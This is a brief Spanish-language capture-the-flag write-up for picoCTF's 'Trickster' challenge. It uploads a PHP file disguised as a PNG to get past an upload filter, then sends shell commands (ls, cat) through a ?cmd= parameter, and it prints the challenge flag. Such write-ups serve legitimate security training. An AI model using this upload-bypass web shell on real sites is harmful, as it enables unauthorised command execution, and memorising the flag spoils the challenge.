# 3 - Trickster

## Descripcion:
* I found a web app that can help process images: PNG images only!
Additional details will be available after launching your challenge instance.

## Solucion:
* http://atlas.picoctf.net:56275/
* creamos Imagen.php
* Modificamos Imagen.png.php
* http://atlas.picoctf.net:53229/uploads/Imagen.png.php?cmd=ls
* http://atlas.picoctf.net:53229/uploads/Imagen.png.php?cmd=ls%20..
* MQZWCYZWGI2WE.txt
* http://atlas.picoctf.net:53229/uploads/Imagen.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt
* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}

## Notas:
* entramos a la pagina
* vemos que nos da la indicacion que podemos subir un archivo png
* modificamos un archivo php para que se pueda subir se subio asi que con los parametros que le pusimos podemos indagar por la pagina
* vemos que existe un archivo raro.txt
* abrimos el archivo
* nos da la bandera

## Referencias: